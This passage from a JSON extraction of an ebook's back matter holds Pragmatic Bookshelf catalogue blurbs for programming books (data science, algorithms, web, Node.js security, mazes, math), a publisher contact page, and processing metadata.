      "content": "Level Up\n\nFrom daily programming to architecture and design, level up your skills starting today.\n\nExercises for Programmers\n\nWhen you write software, you need to be at the top of your game. Great programmers practice to keep their skills sharp. Get sharp and stay sharp with more than fifty practice exercises rooted in real-world scenarios. If you’re a new programmer, these challenges will help you learn what you need to break into the field, and if you’re a seasoned pro, you can use these exercises to learn that hot new language for your next gig.\n\nBrian P. Hogan (118 pages) ISBN: 9781680501223. $24 https://pragprog.com/book/bhwb\n\nDesign It!\n\nDon’t engineer by coincidence—design it like you mean it! Grounded by fundamentals and filled with practical design methods, this is the perfect introduction to software architecture for programmers who are ready to grow their design skills. Ask the right stakeholders the right questions, explore design options, share your design decisions, and facilitate collaborative workshops that are fast, effective, and fun. Become a better pro- grammer, leader, and designer. Use your new skills to lead your team in implementing software with the right capabilities—and develop awesome software!\n\nMichael Keeling (358 pages) ISBN: 9781680502091. $41.95 https://pragprog.com/book/mkdsa",
      "content_length": 1330,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 362,
      "content": "More on Python and Data Structures\n\nMore on data science and basic science, as well as Data Structures for everyone.\n\nData Science Essentials in Python\n\nGo from messy, unstructured artifacts stored in SQL and NoSQL databases to a neat, well-organized dataset with this quick reference for the busy data scientist. Understand text mining, machine learning, and net- work analysis; process numeric data with the NumPy and Pandas modules; describe and analyze data using statistical and network-theoretical methods; and see actual examples of data analysis at work. This one- stop solution covers the essential data science you need in Python.\n\nDmitry Zinoviev (224 pages) ISBN: 9781680501841. $29 https://pragprog.com/book/dzpyds\n\nA Common-Sense Guide to Data Structures and Algorithms\n\nIf you last saw algorithms in a university course or at a job interview, you’re missing out on what they can do for your code. Learn different sorting and searching techniques, and when to use each. Find out how to use recursion effectively. Discover structures for spe- cialized applications, such as trees and graphs. Use Big O notation to decide which algorithms are best for your production environment. Beginners will learn how to use these techniques from the start, and experienced developers will rediscover approaches they may have forgotten.\n\nJay Wengrow (218 pages) ISBN: 9781680502442. $45.95 https://pragprog.com/book/jwdsal",
      "content_length": 1422,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 363,
      "content": "The Modern Web\n\nGet up to speed on the latest HTML, CSS, and JavaScript techniques, and secure your Node applications.\n\nHTML5 and CSS3 (2nd edition)\n\nHTML5 and CSS3 are more than just buzzwords – they’re the foundation for today’s web applications. This book gets you up to speed on the HTML5 elements and CSS3 features you can use right now in your cur- rent projects, with backwards compatible solutions that ensure that you don’t leave users of older browsers behind. This new edition covers even more new fea- tures, including CSS animations, IndexedDB, and client-side validations.\n\nBrian P. Hogan (314 pages) ISBN: 9781937785598. $38 https://pragprog.com/book/bhh52e\n\nSecure Your Node.js Web Application\n\nCyber-criminals have your web applications in their crosshairs. They search for and exploit common secu- rity mistakes in your web application to steal user data. Learn how you can secure your Node.js applications, database and web server to avoid these security holes. Discover the primary attack vectors against web appli- cations, and implement security best practices and effective countermeasures. Coding securely will make you a stronger web developer and analyst, and you’ll protect your users.\n\nKarl Düüna (230 pages) ISBN: 9781680500851. $36 https://pragprog.com/book/kdnodesec",
      "content_length": 1297,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 364,
      "content": "The Joy of Mazes and Math\n\nRediscover the joy and fascinating weirdness of mazes and pure mathematics.\n\nMazes for Programmers\n\nA book on mazes? Seriously?\n\nYes!\n\nNot because you spend your day creating mazes, or because you particularly like solving mazes.\n\nBut because it’s fun. Remember when programming used to be fun? This book takes you back to those days when you were starting to program, and you wanted to make your code do things, draw things, and solve puzzles. It’s fun because it lets you explore and grow your code, and reminds you how it feels to just think.\n\nSometimes it feels like you live your life in a maze of twisty little passages, all alike. Now you can code your way out.\n\nJamis Buck (286 pages) ISBN: 9781680500554. $38 https://pragprog.com/book/jbmaze\n\nGood Math\n\nMathematics is beautiful—and it can be fun and excit- ing as well as practical. Good Math is your guide to some of the most intriguing topics from two thousand years of mathematics: from Egyptian fractions to Tur- ing machines; from the real meaning of numbers to proof trees, group symmetry, and mechanical compu- tation. If you’ve ever wondered what lay beyond the proofs you struggled to complete in high school geom- etry, or what limits the capabilities of the computer on your desk, this is the book for you.\n\nMark C. Chu-Carroll (282 pages) ISBN: 9781937785338. $34 https://pragprog.com/book/mcmath",
      "content_length": 1395,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 365,
      "content": "Pragmatic Programming\n\nWe’ll show you how to be more pragmatic and effective, for new code and old.\n\nYour Code as a Crime Scene\n\nJack the Ripper and legacy codebases have more in common than you’d think. Inspired by forensic psychol- ogy methods, this book teaches you strategies to pre- dict the future of your codebase, assess refactoring direction, and understand how your team influences the design. With its unique blend of forensic psychology and code analysis, this book arms you with the strategies you need, no matter what programming language you use.\n\nAdam Tornhill (218 pages) ISBN: 9781680500387. $36 https://pragprog.com/book/atcrime\n\nThe Nature of Software Development\n\nYou need to get value from your software project. You need it “free, now, and perfect.” We can’t get you there, but we can help you get to “cheaper, sooner, and bet- ter.” This book leads you from the desire for value down to the specific activities that help good Agile projects deliver better software sooner, and at a lower cost. Using simple sketches and a few words, the author invites you to follow his path of learning and under- standing from a half century of software development and from his engagement with Agile methods from their very beginning.\n\nRon Jeffries (176 pages) ISBN: 9781941222379. $24 https://pragprog.com/book/rjnsd",
      "content_length": 1327,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 366,
      "content": "The Pragmatic Bookshelf\n\nThe Pragmatic Bookshelf features books written by developers for developers. The titles continue the well-known Pragmatic Programmer style and continue to garner awards and rave reviews. As development gets more and more difficult, the Pragmatic Programmers will be there with more titles and products to help you stay on top of your game.\n\nVisit Us Online\n\nThis Book’s Home Page https://pragprog.com/book/mnee2 Source code from this book, errata, and other resources. Come give us feedback, too!\n\nRegister for Updates https://pragprog.com/updates Be notified when updates and new books become available.\n\nJoin the Community https://pragprog.com/community Read our weblogs, join our online discussions, participate in our mailing list, interact with our wiki, and benefit from the experience of other Pragmatic Programmers.\n\nNew and Noteworthy https://pragprog.com/news Check out the latest pragmatic developments, new titles and other offerings.\n\nBuy the Book\n\nIf you liked this eBook, perhaps you’d like to have a paper copy of the book. It’s available for purchase at our store: https://pragprog.com/book/mnee2\n\nContact Us\n\nOnline Orders:\n\nhttps://pragprog.com/catalog\n\nCustomer Service:\n\nsupport@pragprog.com\n\nInternational Rights:\n\ntranslations@pragprog.com\n\nAcademic Use:\n\nacademic@pragprog.com\n\nWrite for Us:\n\nhttp://write-for-us.pragprog.com\n\nOr Call:\n\n+1 800-699-7764",
      "content_length": 1401,
      "extraction_method": "Unstructured"
    }
  ],
  "enrichment": {
    "version": "1.0.0",
    "generated_by": "generate_chapter_metadata.py",
    "contains": [
      "keywords",
      "concepts",
      "summary"
    ]
  }
}